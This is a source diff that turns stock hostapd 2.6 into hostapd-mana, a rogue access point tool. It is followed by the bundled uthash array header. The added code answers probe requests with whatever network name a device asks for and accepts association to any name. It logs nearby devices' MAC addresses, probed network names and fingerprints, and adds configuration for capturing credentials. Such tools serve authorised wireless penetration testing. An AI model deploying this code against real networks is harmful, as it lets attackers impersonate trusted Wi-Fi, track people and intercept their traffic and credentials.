diff '--color=auto' -rN hostapd-2.6/src/ap/ap_config.c hostapd-mana/src/ap/ap_config.c
630a631,632
> 	u8 mac1[ETH_ALEN], mac2[ETH_ALEN]; //MANA
> 	int i; //MANA
637c639,647
< 		res = os_memcmp(list[middle].addr, addr, ETH_ALEN);
---
> 		//MANA start - apply MAC mask
> 		for (i=0; i<ETH_ALEN; i++) {
> 			mac1[i] = list[middle].addr[i]; //This is already transformed on load
> 			mac2[i] = addr[i] & list[middle].mask[i];
> 		}
> 		wpa_printf(MSG_DEBUG, "MANA: Comparing " MACSTR "/"MACSTR " against " MACSTR " transformed to " MACSTR,MAC2STR(mac1), MAC2STR(list[middle].mask), MAC2STR(addr), MAC2STR(mac2));
> 		res = os_memcmp(mac1, mac2, ETH_ALEN);
> 		//MANA end
> 		//res = os_memcmp(list[middle].addr, addr, ETH_ALEN);
642a653,656
> 		//MANA start
> 		if (res != 0)
> 			res = os_memcmp(mac1, addr, ETH_ALEN); //binary search requires a constant value, transformed value is changing each time
> 		//MANA end
651a666,680
> // MANA Start - SSID filter
> int hostapd_ssidlist_found(struct ssid_filter_entry *list, int num_entries, const char *ssid)
> {
> 	int start, end;
> 	start = 0;
> 	end = num_entries - 1;
> 	while (start <= end) {
> 		if (!strcmp(list[start].ssid, ssid)) {
> 			return 1;
> 		}
> 		start++;
> 	}
> 	return 0;
> }
> // MANA End
diff '--color=auto' -rN hostapd-2.6/src/ap/ap_config.h hostapd-mana/src/ap/ap_config.h
60a61
> 	macaddr mask; //MANA
63a65,68
> struct ssid_filter_entry { //MANA
> 	char ssid[SSID_MAX_LEN];
> };
> 
298a304,305
> 	struct ssid_filter_entry *ssid_filter; //MANA
> 	int num_ssid_filter; //MANA
607a615,629
> 	// MANA
> 	int enable_mana;
> 	int mana_loud;
> 	int mana_macacl;
> 	char * mana_outfile;
> 	char * mana_ssid_filter_file;
> 	int mana_wpe;
> 	char * mana_credout;
> 	char * mana_wpaout;
> 	int mana_eapsuccess;
> 	int mana_eaptls;
> 	int enable_sycophant;
> 	char * sycophant_dir;
> 	// MANA END
> 
721a744,745
> int hostapd_ssidlist_found(struct ssid_filter_entry *list, int num_entires, //MANA
> 			  const char *ssid);
diff '--color=auto' -rN hostapd-2.6/src/ap/beacon.c hostapd-mana/src/ap/beacon.c
32a33,34
> // MANA START
> #include "common/mana.h" //MANA
33a36,38
> struct mana_mac *mana_machash = NULL;
> struct mana_ssid *mana_ssidhash = NULL;
> // MANA END
83a89,125
> //Start MANA
> //Log output of observed MACs & SSIDs
> static void log_ssid(struct hostapd_data *hapd, const u8 *ssid, size_t ssid_len, const u8 *mac) {
> 	if (os_strcmp("NOT_SET", hapd->iconf->mana_outfile) == 0) {
> 		return; // File not set, so don't log
> 	}
> 	FILE *f = fopen(hapd->iconf->mana_outfile, "a");
> 	if (f != NULL) {
> 		int rand=0;
> 		if (mac[0] & 2) //Check if locally administered aka random MAC
> 			rand=1; 
> 
> #ifdef CONFIG_TAXONOMY
> 		struct sta_info *sta;
> 		struct hostapd_sta_info *info;
> 		if ((sta = ap_get_sta(hapd, mac)) != NULL) {
> 			char reply[512] = "";
> 			size_t reply_len = 512;
> 			retrieve_sta_taxonomy(hapd, sta, reply, reply_len);
> 			fprintf(f,MACSTR ", %s, %d, %s\n", MAC2STR(mac), wpa_ssid_txt(ssid, ssid_len), rand, reply);
> 		} else if ((info = sta_track_get(hapd->iface, mac)) != NULL) {
> 			char reply[512] = "";
> 			size_t reply_len = 512;
> 			retrieve_hostapd_sta_taxonomy(hapd, info, reply, reply_len);
> 			fprintf(f,MACSTR ", %s, %d, %s\n", MAC2STR(mac), wpa_ssid_txt(ssid, ssid_len), rand, reply);
> 		} else {
> 			fprintf(f,MACSTR ", %s, %d\n", MAC2STR(mac), wpa_ssid_txt(ssid, ssid_len), rand);
> 		}
> #endif /* CONFIG_TAXONOMY */
> #ifndef CONFIG_TAXONOMY
> 		fprintf(f,MACSTR ", %s, %d\n", MAC2STR(mac), wpa_ssid_txt(ssid, ssid_len), rand);
> #endif /* CONFIG_TAXONOMY */
> 		fclose(f);
> 	} else
> 		wpa_printf(MSG_ERROR, "MANA: Error writing to activity file %s", hapd->iconf->mana_outfile);
> }
> //End MANA
366a409
> 				   const u8 *ssid, size_t ssid_len, //MANA
404a448,466
> 
> 	//MANA - check against macacl
> 	if (req && hapd->iconf->mana_macacl) {
> 		int match;
> 		if (hapd->iconf->bss[0]->macaddr_acl == DENY_UNLESS_ACCEPTED) {
> 			match = hostapd_maclist_found(hapd->conf->accept_mac, hapd->conf->num_accept_mac, req->sa, NULL);
> 			if (!match) {
> 				wpa_printf(MSG_DEBUG, "MANA: Station MAC is not authorised by accept ACL: " MACSTR, MAC2STR(req->sa));
> 				return NULL; //MAC is not in accept list, back out and don't send
> 			}
> 		} else if (hapd->iconf->bss[0]->macaddr_acl == ACCEPT_UNLESS_DENIED) {
> 			if (hostapd_maclist_found(hapd->conf->deny_mac, hapd->conf->num_deny_mac, req->sa, NULL)) {
> 				wpa_printf(MSG_DEBUG, "MANA: Station MAC is not authorised by deny ACL: " MACSTR, MAC2STR(req->sa));
> 				return NULL; //MAC is in deny list, back out and don't send
> 			}
> 		}
> 		wpa_printf(MSG_INFO, "MANA: Station MAC is authorised by ACL: " MACSTR, MAC2STR(req->sa));
> 	}
>     //MANA END
419,421c481,494
< 	*pos++ = hapd->conf->ssid.ssid_len;
< 	os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
< 	pos += hapd->conf->ssid.ssid_len;
---
> 	//*pos++ = hapd->conf->ssid.ssid_len;
> 	//os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
> 	//pos += hapd->conf->ssid.ssid_len;
>  	// MANA START
>  	if (hapd->iconf->enable_mana && ssid_len > 0) {
>  		*pos++ = ssid_len;
>  		os_memcpy(pos, ssid, ssid_len);
>  		pos += ssid_len;
>  	} else {
>  		*pos++ = hapd->conf->ssid.ssid_len;
>  		os_memcpy(pos, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len);
>  		pos += hapd->conf->ssid.ssid_len;
>  	}
>  	// MANA END
427c500
< 	pos = hostapd_eid_ds_params(hapd, pos);
---
> 	pos = hostapd_eid_ds_params(hapd, pos); //MANA
540d612
< 
608c680,681
< static struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface,
---
> //static struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface, //MANA
> struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface,
709a783
> 	int iterate = 0; //MANA
786a861,866
> 	if (os_strcmp(hapd->iconf->mana_ssid_filter_file,"NOT_SET") && elems.ssid_len != 0) { //MANA
> 		if (!hostapd_ssidlist_found(hapd->conf->ssid_filter, hapd->conf->num_ssid_filter, wpa_ssid_txt(elems.ssid, elems.ssid_len))) {
> 			wpa_printf(MSG_DEBUG, "MANA - SSID '%s' not found in list.", wpa_ssid_txt(elems.ssid, elems.ssid_len));
> 			return;
> 		}
> 	}
789c869
< 	    elems.ssid_list_len == 0) {
---
> 	    elems.ssid_list_len == 0 && !hapd->iconf->enable_mana) { //MANA
806c886
< 	{
---
> 	
811a892,897
> 			//START MANA - JUST CHECK TAXONOMY IN OUTPUT
> 			char reply[512] = "";
> 			size_t reply_len = 512;
> 			retrieve_sta_taxonomy(hapd, sta, reply, reply_len);
> 			wpa_printf(MSG_MSGDUMP, "MANA TAXONOMY STA '%s'", reply);
> 			//END MANA
815a902,907
> 			//START MANA - JUST CHECK TAXONOMY IN OUTPUT
> 			char reply[512] = "";
> 			size_t reply_len = 512;
> 			retrieve_hostapd_sta_taxonomy(hapd, info, reply, reply_len);
> 			wpa_printf(MSG_MSGDUMP, "MANA TAXONOMY STA '%s'", reply);
> 			//END MANA
817c909
< 	}
---
> 	
822c914,917
< 	if (res == NO_SSID_MATCH) {
---
> 	//MANA START
>  	// todo handle ssid_list see ssid_match for code
>  	// todo change emit code below (global flag?)
> 	if (!hapd->iconf->enable_mana && res == NO_SSID_MATCH) {
831a927,967
> 	} else if (hapd->iconf->enable_mana) {
> 		if (res == WILDCARD_SSID_MATCH) {
> 			//Broadcast probe no need to record SSID or STA
> 			wpa_printf(MSG_DEBUG,"MANA - Broadcast probe request from " MACSTR "",MAC2STR(mgmt->sa));
> 			iterate = 1; //iterate through hash emitting multiple probe responses
> 			log_ssid(hapd, (const u8 *)"<Broadcast>", 11, mgmt->sa);
> 		} else {
> 			//Directed probe
> 			struct mana_ssid *newssid = NULL;
> 			struct mana_mac *newsta = NULL;
> 			if (hapd->iconf->mana_loud) {
> 				//Loud mode check ssidhash
> 				HASH_FIND_STR(mana_ssidhash, wpa_ssid_txt(elems.ssid, elems.ssid_len), newssid);
> 			} else {
> 				//Not loud mode, check if the STA probing is in our hash
> 				HASH_FIND(hh,mana_machash, mgmt->sa, 6, newsta);
> 				if (newsta == NULL) { //STA MAC not seen before adding to hash
> 					wpa_printf(MSG_DEBUG, "MANA - Adding STA " MACSTR " to the hash.", MAC2STR(mgmt->sa));
> 					newsta = (struct mana_mac*)os_malloc(sizeof(struct mana_mac));
> 					os_memcpy(newsta->sta_addr, mgmt->sa, ETH_ALEN);
> 					newsta->ssids = NULL;
> 					HASH_ADD(hh,mana_machash, sta_addr, 6, newsta);
> 				}
> 				HASH_FIND_STR(newsta->ssids, wpa_ssid_txt(elems.ssid, elems.ssid_len), newssid);
> 			}
> 
> 			if (newssid == NULL) {
> 				//Probed for SSID not found (and not Broadcast) add SSID to hash
> 				wpa_printf(MSG_DEBUG, "MANA - Adding SSID %s(%d) from STA " MACSTR " to the hash.", wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len, MAC2STR(mgmt->sa));
> 				struct mana_ssid *newssid = os_malloc(sizeof(struct mana_ssid));
> 				os_memcpy(newssid->ssid_txt, wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len+1);
> 				os_memcpy(newssid->ssid, elems.ssid, elems.ssid_len);
> 				newssid->ssid_len = elems.ssid_len;
> 				if (hapd->iconf->mana_loud)
> 					HASH_ADD_STR(mana_ssidhash, ssid_txt, newssid);
> 				else
> 					HASH_ADD_STR(newsta->ssids, ssid_txt, newssid);
> 			}
>  			wpa_printf(MSG_INFO,"MANA - Directed probe request for SSID '%s' from " MACSTR "",wpa_ssid_txt(elems.ssid, elems.ssid_len),MAC2STR(mgmt->sa));
> 			log_ssid(hapd, elems.ssid, elems.ssid_len, mgmt->sa);
>  		}
832a969
> 	//MANA END
912,928d1048
< 	resp = hostapd_gen_probe_resp(hapd, mgmt, elems.p2p != NULL,
< 				      &resp_len);
< 	if (resp == NULL)
< 		return;
< 
< 	/*
< 	 * If this is a broadcast probe request, apply no ack policy to avoid
< 	 * excessive retries.
< 	 */
< 	noack = !!(res == WILDCARD_SSID_MATCH &&
< 		   is_broadcast_ether_addr(mgmt->da));
< 
< 	csa_offs_len = 0;
< 	if (hapd->csa_in_progress) {
< 		if (hapd->cs_c_off_proberesp)
< 			csa_offs[csa_offs_len++] =
< 				hapd->cs_c_off_proberesp;
930,937c1050,1059
< 		if (hapd->cs_c_off_ecsa_proberesp)
< 			csa_offs[csa_offs_len++] =
< 				hapd->cs_c_off_ecsa_proberesp;
< 	}
< 
< 	ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
< 					csa_offs_len ? csa_offs : NULL,
< 					csa_offs_len);
---
> 	//MANA Start - this is just the same original code repeated twice, except MANA has a hash iterator around it
> 	if (!iterate) { //MANA Either we're not in mana or it's not a broadcast probe
> 		if (!hapd->iconf->enable_mana) //MANA if *not* mana, respond with the proper ssid
> 			resp = hostapd_gen_probe_resp(hapd, hapd->conf->ssid.ssid, hapd->conf->ssid.ssid_len, mgmt, elems.p2p != NULL, &resp_len);
> 		else {
> 			wpa_printf(MSG_DEBUG, "MANA - Attempting to generate response : %.*s (%d) for STA " MACSTR, elems.ssid_len, elems.ssid, elems.ssid_len, MAC2STR(mgmt->sa));
> 			resp = hostapd_gen_probe_resp(hapd, elems.ssid, elems.ssid_len, mgmt, elems.p2p != NULL, &resp_len);
> 		}
> 		if (resp == NULL)
> 			return;
939,940c1061,1077
< 	if (ret < 0)
< 		wpa_printf(MSG_INFO, "handle_probe_req: send failed");
---
> 		/*
> 	 	* If this is a broadcast probe request, apply no ack policy to avoid
> 	 	* excessive retries.
> 	 	*/
> 		noack = !!(res == WILDCARD_SSID_MATCH &&
> 		   	is_broadcast_ether_addr(mgmt->da));
> 
> 		csa_offs_len = 0;
> 		if (hapd->csa_in_progress) {
> 			if (hapd->cs_c_off_proberesp)
> 				csa_offs[csa_offs_len++] =
> 					hapd->cs_c_off_proberesp;
> 
> 			if (hapd->cs_c_off_ecsa_proberesp)
> 				csa_offs[csa_offs_len++] =
> 					hapd->cs_c_off_ecsa_proberesp;
> 		}
942c1079,1143
< 	os_free(resp);
---
> 		ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
> 						csa_offs_len ? csa_offs : NULL,
> 						csa_offs_len);
> 
> 		if (ret < 0)
> 			wpa_printf(MSG_INFO, "handle_probe_req: send failed");
> 
> 		os_free(resp);
> 
> 		wpa_printf(MSG_EXCESSIVE, "STA " MACSTR " sent probe request for %s "
> 			   "SSID", MAC2STR(mgmt->sa),
> 			   elems.ssid_len == 0 ? "broadcast" : "our");
> 	} else { 
> 		//MANA iterate
> 		struct mana_ssid *khash;
> 		struct mana_ssid *k;
> 		struct mana_mac *newsta = NULL;
> 
> 		// Select appropriate hash to iterate
> 		if (hapd->iconf->mana_loud)
> 			khash = mana_ssidhash;
> 		else {
> 			// Find specific MAC's SSID hash
> 			HASH_FIND(hh, mana_machash, mgmt->sa, 6, newsta);
> 			if (newsta == NULL)
> 				return;
> 			khash = newsta->ssids;
> 		}
> 		for ( k = khash; k != NULL; k = (struct mana_ssid*)(k->hh.next)) {
> 			wpa_printf(MSG_DEBUG, "MANA: Generating Broadcast response : %s (%zu) for STA " MACSTR, k->ssid_txt, k->ssid_len, MAC2STR(mgmt->sa));
> 			resp = hostapd_gen_probe_resp(hapd, k->ssid, k->ssid_len, mgmt, elems.p2p != NULL, &resp_len);
> 			if (resp == NULL)
> 				return;
> 
> 			/*
> 	 		* If this is a broadcast probe request, apply no ack policy to avoid
> 	 		* excessive retries.
> 	 		*/
> 			noack = !!(res == WILDCARD_SSID_MATCH &&
> 		   		is_broadcast_ether_addr(mgmt->da));
> 
> 			csa_offs_len = 0;
> 			if (hapd->csa_in_progress) {
> 				if (hapd->cs_c_off_proberesp)
> 					csa_offs[csa_offs_len++] =
> 						hapd->cs_c_off_proberesp;
> 
> 				if (hapd->cs_c_off_ecsa_proberesp)
> 					csa_offs[csa_offs_len++] =
> 						hapd->cs_c_off_ecsa_proberesp;
> 			}
> 
> 			ret = hostapd_drv_send_mlme_csa(hapd, resp, resp_len, noack,
> 							csa_offs_len ? csa_offs : NULL,
> 							csa_offs_len);
> 
> 			if (ret < 0)
> 				wpa_printf(MSG_ERROR, "handle_probe_req: send failed");
> 
> 			os_free(resp);
> 
> 			wpa_printf(MSG_EXCESSIVE, "MANA: STA " MACSTR " sent probe request for %s "
> 			   	"SSID", MAC2STR(mgmt->sa), k->ssid);
> 		} //for
> 	} //MANA iterate END
944,946d1144
< 	wpa_printf(MSG_EXCESSIVE, "STA " MACSTR " sent probe request for %s "
< 		   "SSID", MAC2STR(mgmt->sa),
< 		   elems.ssid_len == 0 ? "broadcast" : "our");
949d1146
< 
982c1179,1180
< 	return hostapd_gen_probe_resp(hapd, NULL, 0, resp_len);
---
> 	//return hostapd_gen_probe_resp(hapd, NULL, 0, resp_len);
> 	return hostapd_gen_probe_resp(hapd, NULL, 0, NULL, 0, resp_len); //MANA
1334c1532,1544
< 	hostapd_free_ap_extra_ies(hapd, beacon, proberesp, assocresp);
---
> 	//  MANA - Start Beacon Stuffs here
> 	//hostapd_free_ap_extra_ies(hapd, beacon, proberesp, assocresp);
> 	//struct wpa_driver_ap_params params2 = params;
> 	//os_memset(&params2.ssid, 0, params2.ssid_len);
> 	//params2.hide_ssid = HIDDEN_SSID_ZERO_CONTENTS;
> 	//hostapd_build_ap_extra_ies(hapd, &beacon, &proberesp, &assocresp);
> 	//params2.beacon_ies = beacon;
> 	//params2.proberesp_ies = proberesp;
>    //params2.assocresp_ies = assocresp;
> 	//wpa_printf(MSG_INFO, "ZZZZ : Sending Hidden AP: %s", params2.ssid);
> 	//res = hostapd_drv_set_ap(hapd, &params2);
> 	//hostapd_free_ap_extra_ies(hapd, beacon, proberesp, assocresp);
> 	//  MANA - End Beacon Stuff here
diff '--color=auto' -rN hostapd-2.6/src/ap/beacon.h hostapd-mana/src/ap/beacon.h
26a27,28
> struct hostapd_sta_info * sta_track_get(struct hostapd_iface *iface, //MANA
>                                                const u8 *addr);
33a36,55
> 
> // MANA START
> #include "uthash/uthash.h"
> struct mana_ssid {
>         char ssid_txt[SSID_MAX_LEN+1];
>         u8 ssid[SSID_MAX_LEN];
>         size_t ssid_len;
> 		//u8 sta_addr[6];
>         UT_hash_handle hh;
> };
> //struct mana_ssid *mana_data;
> struct mana_mac {
> 	//char mac_txt[18];
> 	u8 sta_addr[6];
> 	struct mana_ssid *ssids;
> 	UT_hash_handle hh;
> };
> extern struct mana_mac *mana_machash;
> extern struct mana_ssid *mana_ssidhash;
> // MANA END
diff '--color=auto' -rN hostapd-2.6/src/ap/drv_callbacks.c hostapd-mana/src/ap/drv_callbacks.c
830c830
< 		if (os_memcmp(bssid, iface->bss[i]->own_addr, ETH_ALEN) == 0)
---
> 		if (os_memcmp(bssid, iface->bss[i]->own_addr, ETH_ALEN) == 0) 
diff '--color=auto' -rN hostapd-2.6/src/ap/hostapd.c hostapd-mana/src/ap/hostapd.c
47a48
> #include "common/mana.h" //MANA
180a182
> 	mana.conf = newconf; //MANA
2112a2115
> 	mana.conf = conf; //MANA
diff '--color=auto' -rN hostapd-2.6/src/ap/ieee802_11.c hostapd-mana/src/ap/ieee802_11.c
1420,1428c1420,1431
< 
< 	if (ssid_ie_len != hapd->conf->ssid.ssid_len ||
< 	    os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0) {
< 		hostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_IEEE80211,
< 			       HOSTAPD_LEVEL_INFO,
< 			       "Station tried to associate with unknown SSID "
< 			       "'%s'", wpa_ssid_txt(ssid_ie, ssid_ie_len));
< 		return WLAN_STATUS_UNSPECIFIED_FAILURE;
< 	}
---
> 	if (hapd->iconf->enable_mana) {
> 		wpa_printf(MSG_MSGDUMP, "MANA - Checking SSID for start of association, pass through %s", wpa_ssid_txt(ssid_ie, ssid_ie_len));
> 		return WLAN_STATUS_SUCCESS;
> 	} else {
> 		if (ssid_ie_len != hapd->conf->ssid.ssid_len ||
> 			os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0) {
> 			hostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_IEEE80211,
> 					   HOSTAPD_LEVEL_INFO,
> 					   "Station tried to associate with unknown SSID "
> 					   "'%s'", wpa_ssid_txt(ssid_ie, ssid_ie_len));
> 			return WLAN_STATUS_UNSPECIFIED_FAILURE;
> 		}
1430a1434
> 	}
2855a2860,2869
> 
> 		// Print that it has associated and give the MAC and AP
> 		if (hapd->iconf->enable_mana && sta->ssid_probe_mana) {
> 			struct hostapd_ssid *ssid = sta->ssid_probe_mana;
> 
> 			 wpa_printf(MSG_INFO,"MANA - Successful association of " MACSTR " to ESSID '%s'\n",
> 				   MAC2STR(mgmt->da), ssid->ssid);
> 		}
> 
> 		// MANA END
diff '--color=auto' -rN hostapd-2.6/src/ap/sta_info.h hostapd-mana/src/ap/sta_info.h
220a221
> 	struct hostapd_ssid *ssid_probe_mana; //MANA
diff '--color=auto' -rN hostapd-2.6/src/ap/taxonomy.c hostapd-mana/src/ap/taxonomy.c
265a266,289
> //START MANA
> int retrieve_hostapd_sta_taxonomy(const struct hostapd_data *hapd,
>                           struct hostapd_sta_info *info, char *buf, size_t buflen)
> {
> 	int ret;
> 	char *pos, *end;
> 
> 	if (!info->probe_ie_taxonomy)
> 		return 0;
> 
> 	ret = os_snprintf(buf, buflen, "wifi4|probe:");
> 	if (os_snprintf_error(buflen, ret))
> 		return 0;
> 	pos = buf + ret;
> 	end = buf + buflen;
> 
> 	ie_to_string(pos, end - pos, info->probe_ie_taxonomy);
> 	pos = os_strchr(pos, '\0');
> 	if (pos >= end)
> 		return 0;
> 	return pos - buf;
> }
> //END MANA
> 
diff '--color=auto' -rN hostapd-2.6/src/ap/taxonomy.h hostapd-mana/src/ap/taxonomy.h
22a23,24
> int retrieve_hostapd_sta_taxonomy(const struct hostapd_data *hapd, //MANA
>                           struct hostapd_sta_info *info, char *buf, size_t buflen); //MANA
diff '--color=auto' -rN hostapd-2.6/src/ap/uthash/utarray.h hostapd-mana/src/ap/uthash/utarray.h
0a1,233
> /*
> Copyright (c) 2008-2014, Troy D. Hanson   http://troydhanson.github.com/uthash/
> All rights reserved.
> 
> Redistribution and use in source and binary forms, with or without
> modification, are permitted provided that the following conditions are met:
> 
>     * Redistributions of source code must retain the above copyright
>       notice, this list of conditions and the following disclaimer.
> 
> THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS
> IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
> TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
> PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER
> OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
> EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
> PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
> LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
> NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
> SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
> */
> 
> /* a dynamic array implementation using macros 
>  */
> #ifndef UTARRAY_H
> #define UTARRAY_H
> 
> #define UTARRAY_VERSION 1.9.9
> 
> #ifdef __GNUC__
> #define _UNUSED_ __attribute__ ((__unused__)) 
> #else
> #define _UNUSED_ 
> #endif
> 
> #include <stddef.h>  /* size_t */
> #include <sys/types.h>  /* ssize_t */
> #include <string.h>  /* memset, etc */
> #include <stdlib.h>  /* exit */
> 
> #define oom() exit(-1)
> 
> typedef void (ctor_f)(void *dst, const void *src);
> typedef void (dtor_f)(void *elt);
> typedef void (init_f)(void *elt);
> typedef struct {
>     size_t sz;
>     init_f *init;
>     ctor_f *copy;
>     dtor_f *dtor;
> } UT_icd;
> 
> typedef struct {
>     unsigned i,n;/* i: index of next available slot, n: num slots */
>     UT_icd icd;  /* initializer, copy and destructor functions */
>     char *d;     /* n slots of size icd->sz*/
> } UT_array;
> 
> #define utarray_init(a,_icd) do {                                             \
>   memset(a,0,sizeof(UT_array));                                               \
>   (a)->icd=*_icd;                                                             \
> } while(0)
> 
> #define utarray_done(a) do {                                                  \
>   if ((a)->n) {                                                               \
>     if ((a)->icd.dtor) {                                                      \
>       size_t _ut_i;                                                           \
>       for(_ut_i=0; _ut_i < (a)->i; _ut_i++) {                                 \
>         (a)->icd.dtor(utarray_eltptr(a,_ut_i));                               \
>       }                                                                       \
>     }                                                                         \
>     free((a)->d);                                                             \
>   }                                                                           \
>   (a)->n=0;                                                                   \
> } while(0)
> 
> #define utarray_new(a,_icd) do {                                              \
>   a=(UT_array*)malloc(sizeof(UT_array));                                      \
>   utarray_init(a,_icd);                                                       \
> } while(0)
> 
> #define utarray_free(a) do {                                                  \
>   utarray_done(a);                                                            \
>   free(a);                                                                    \
> } while(0)
> 
> #define utarray_reserve(a,by) do {                                            \
>   if (((a)->i+by) > ((a)->n)) {                                               \
>     while(((a)->i+by) > ((a)->n)) { (a)->n = ((a)->n ? (2*(a)->n) : 8); }     \
>     if ( ((a)->d=(char*)realloc((a)->d, (a)->n*(a)->icd.sz)) == NULL) oom();  \
>   }                                                                           \
> } while(0)
> 
> #define utarray_push_back(a,p) do {                                           \
>   utarray_reserve(a,1);                                                       \
>   if ((a)->icd.copy) { (a)->icd.copy( _utarray_eltptr(a,(a)->i++), p); }      \
>   else { memcpy(_utarray_eltptr(a,(a)->i++), p, (a)->icd.sz); };              \
> } while(0)
> 
> #define utarray_pop_back(a) do {                                              \
>   if ((a)->icd.dtor) { (a)->icd.dtor( _utarray_eltptr(a,--((a)->i))); }       \
>   else { (a)->i--; }                                                          \
> } while(0)
> 
> #define utarray_extend_back(a) do {                                           \
>   utarray_reserve(a,1);                                                       \
>   if ((a)->icd.init) { (a)->icd.init(_utarray_eltptr(a,(a)->i)); }            \
>   else { memset(_utarray_eltptr(a,(a)->i),0,(a)->icd.sz); }                   \
>   (a)->i++;                                                                   \
> } while(0)
> 
> #define utarray_len(a) ((a)->i)
> 
> #define utarray_eltptr(a,j) (((j) < (a)->i) ? _utarray_eltptr(a,j) : NULL)
> #define _utarray_eltptr(a,j) ((char*)((a)->d + ((a)->icd.sz*(j) )))
> 
> #define utarray_insert(a,p,j) do {                                            \
>   if (j > (a)->i) utarray_resize(a,j);                                        \
>   utarray_reserve(a,1);                                                       \
>   if ((j) < (a)->i) {                                                         \
>     memmove( _utarray_eltptr(a,(j)+1), _utarray_eltptr(a,j),                  \
>              ((a)->i - (j))*((a)->icd.sz));                                   \
>   }                                                                           \
>   if ((a)->icd.copy) { (a)->icd.copy( _utarray_eltptr(a,j), p); }             \
>   else { memcpy(_utarray_eltptr(a,j), p, (a)->icd.sz); };                     \
>   (a)->i++;                                                                   \
> } while(0)
> 
> #define utarray_inserta(a,w,j) do {                                           \
>   if (utarray_len(w) == 0) break;                                             \
>   if (j > (a)->i) utarray_resize(a,j);                                        \
>   utarray_reserve(a,utarray_len(w));                                          \
>   if ((j) < (a)->i) {                                                         \
>     memmove(_utarray_eltptr(a,(j)+utarray_len(w)),                            \
>             _utarray_eltptr(a,j),                                             \
>             ((a)->i - (j))*((a)->icd.sz));                                    \
>   }                                                                           \
>   if ((a)->icd.copy) {                                                        \
>     size_t _ut_i;                                                             \
>     for(_ut_i=0;_ut_i<(w)->i;_ut_i++) {                                       \
>       (a)->icd.copy(_utarray_eltptr(a,j+_ut_i), _utarray_eltptr(w,_ut_i));    \
>     }                                                                         \
>   } else {                                                                    \
>     memcpy(_utarray_eltptr(a,j), _utarray_eltptr(w,0),                        \
>            utarray_len(w)*((a)->icd.sz));                                     \
>   }                                                                           \
>   (a)->i += utarray_len(w);                                                   \
> } while(0)
> 
> #define utarray_resize(dst,num) do {                                          \
>   size_t _ut_i;                                                               \
>   if (dst->i > (size_t)(num)) {                                               \
>     if ((dst)->icd.dtor) {                                                    \
>       for(_ut_i=num; _ut_i < dst->i; _ut_i++) {                               \
>         (dst)->icd.dtor(utarray_eltptr(dst,_ut_i));                           \
>       }                                                                       \
>     }                                                                         \
>   } else if (dst->i < (size_t)(num)) {                                        \
>     utarray_reserve(dst,num-dst->i);                                          \
>     if ((dst)->icd.init) {                                                    \
>       for(_ut_i=dst->i; _ut_i < num; _ut_i++) {                               \
>         (dst)->icd.init(utarray_eltptr(dst,_ut_i));                           \
>       }                                                                       \
>     } else {                                                                  \
>       memset(_utarray_eltptr(dst,dst->i),0,(dst)->icd.sz*(num-dst->i));       \
>     }                                                                         \
>   }                                                                           \
>   dst->i = num;                                                               \
> } while(0)
> 
> #define utarray_concat(dst,src) do {                                          \
>   utarray_inserta((dst),(src),utarray_len(dst));                              \
> } while(0)
> 
> #define utarray_erase(a,pos,len) do {                                         \
>   if ((a)->icd.dtor) {                                                        \
>     size_t _ut_i;                                                             \
>     for(_ut_i=0; _ut_i < len; _ut_i++) {                                      \
>       (a)->icd.dtor(utarray_eltptr((a),pos+_ut_i));                           \
>     }                                                                         \
>   }                                                                           \
>   if ((a)->i > (pos+len)) {                                                   \
>     memmove( _utarray_eltptr((a),pos), _utarray_eltptr((a),pos+len),          \
>             (((a)->i)-(pos+len))*((a)->icd.sz));                              \
>   }                                                                           \
>   (a)->i -= (len);                                                            \
> } while(0)
> 
> #define utarray_renew(a,u) do {                                               \
>   if (a) utarray_clear(a); \
>   else utarray_new((a),(u));   \
> } while(0) 
> 
> #define utarray_clear(a) do {                                                 \
>   if ((a)->i > 0) {                                                           \
>     if ((a)->icd.dtor) {                                                      \
>       size_t _ut_i;                                                           \
>       for(_ut_i=0; _ut_i < (a)->i; _ut_i++) {                                 \
>         (a)->icd.dtor(utarray_eltptr(a,_ut_i));                               \
>       }                                                                       \
>     }                                                                         \
>     (a)->i = 0;                                                               \
>   }                                                                           \
> } while(0)
> 
> #define utarray_sort(a,cmp) do {                                              \
>   qsort((a)->d, (a)->i, (a)->icd.sz, cmp);                                    \
> } while(0)
> 
> #define utarray_find(a,v,cmp) bsearch((v),(a)->d,(a)->i,(a)->icd.sz,cmp)
> 
> #define utarray_front(a) (((a)->i) ? (_utarray_eltptr(a,0)) : NULL)
> #define utarray_next(a,e) (((e)==NULL) ? utarray_front(a) : ((((a)->i) > (utarray_eltidx(a,e)+1)) ? _utarray_eltptr(a,utarray_eltidx(a,e)+1) : NULL))
